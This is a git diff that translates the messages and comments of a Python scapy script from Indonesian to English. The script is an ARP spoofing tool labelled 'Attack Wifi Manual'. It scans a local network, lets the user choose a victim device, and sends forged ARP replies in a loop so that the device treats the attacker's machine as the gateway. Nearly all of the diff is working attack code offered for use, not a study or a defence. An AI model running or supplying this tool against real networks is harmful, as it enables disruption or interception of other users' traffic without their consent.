@@ -3,9 +3,9 @@ import time
 
 def scan_network(network_range):
     """
-    Melakukan ARP scan pada jaringan dan mengembalikan daftar perangkat yang aktif.
+    Performs an ARP scan on the network and returns a list of active devices.
     """
-    print(f"[+] Scanning jaringan {network_range}...\n")
+    print(f"[+] Scanning Network {network_range}...\n")
     
     arp_request = ARP(pdst=network_range)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -21,9 +21,9 @@ def scan_network(network_range):
 
 def display_devices(devices):
     """
-    Menampilkan daftar perangkat yang ditemukan dalam jaringan.
+    Displays a list of devices discovered in the network.
     """
-    print("\nDaftar Perangkat yang Terdeteksi:")
+    print("\nList of Detected Devices:")
     print("="*50)
     print("No.\tIP Address\t\tMAC Address")
     print("="*50)
@@ -33,7 +33,7 @@ def display_devices(devices):
 
 def get_mac(ip):
     """
-    Mendapatkan MAC address dari IP target.
+    Get MAC address of target IP.
     """
     arp_request = ARP(pdst=ip)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -47,41 +47,41 @@ def get_mac(ip):
 
 def arp_spoof(target_ip, spoof_ip):
     """
-    Mengirimkan paket ARP Spoofing untuk mengelabui target.
+    Sending ARP Spoofing packets to trick the target.
     """
     target_mac = get_mac(target_ip)
     
     if not target_mac:
-        print("[!] Gagal mendapatkan MAC address target.")
+        print("[!] Failed to get target MAC address.")
         return
     
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     
-    print(f"[+] Memulai ARP Spoofing ke {target_ip} ({target_mac})...")
+    print(f"[+] Start ARP Spoofing To {target_ip} ({target_mac})...")
     try:
         while True:
             send(packet, verbose=False)
-            print(f"[+] Mengirim ARP Spoof ke {target_ip}, berpura-pura sebagai {spoof_ip}")
+            print(f"[+] Start ARP Spoof To {target_ip}, pretend to be {spoof_ip}")
             time.sleep(2)
     except KeyboardInterrupt:
-        print("\n[+] Serangan dihentikan.")
+        print("\n[+] The attack was stopped.")
 
 # --- Main Program ---
 print("="*50)
-print("     ARP Spoofer - Manual IP Input")
+print("     ARP Spoofer - Attack Wifi Manual")
 print("="*50)
 
 # **1. Memasukkan IP Gateway**
-gateway_ip = input("Masukkan IP Gateway: ").strip()
+gateway_ip = input("Input IP Gateway: ").strip()
 
 # **2. Memilih metode scanning**
-print("\n[1] Scan Jaringan Otomatis")
-print("[2] Masukkan IP Target Manual")
-mode = input("Pilih metode (1/2): ").strip()
+print("\n[1] Scan Automatic Networking")
+print("[2] Input IP Target Manual")
+mode = input("Select Method (1/2): ").strip()
 
 if mode == "1":
     # **User Memasukkan Range IP Jaringan untuk Scan**
-    network_range = input("Masukkan range IP (contoh: 192.168.1.0/24): ").strip()
+    network_range = input("Input IP (Example: 192.168.1.0/24): ").strip()
     if not "/" in network_range:
         network_range += "/24"  # Tambahkan subnet default jika tidak ada
     
@@ -89,15 +89,15 @@ if mode == "1":
     devices = scan_network(network_range)
     
     if not devices:
-        print("[!] Tidak ada perangkat ditemukan.")
+        print("[!] No device found.")
     else:
         display_devices(devices)
 
         # **Memilih target dari daftar hasil scan**
         try:
-            target_index = int(input("Pilih nomor target: ")) - 1
+            target_index = int(input("Select Target Number: ")) - 1
             if target_index < 0 or target_index >= len(devices):
-                print("[!] Nomor tidak valid.")
+                print("[!] Number Not Valid.")
             else:
                 target_ip = devices[target_index]["ip"]
                 print(f"[+] Target: {target_ip}")
@@ -107,14 +107,14 @@ if mode == "1":
                 arp_spoof(target_ip, gateway_ip)
 
         except ValueError:
-            print("[!] Input harus berupa angka.")
+            print("[!] Input Valid Number.")
 
 elif mode == "2":
     # **User Memasukkan IP Target Secara Manual**
-    target_ip = input("Masukkan IP Target: ").strip()
+    target_ip = input("Input IP Target: ").strip()
     
     # **Menjalankan ARP Spoofing**
     arp_spoof(target_ip, gateway_ip)
 
 else:
-    print("[!] Pilihan tidak valid.")
+    print("[!] Select Not Valid.")
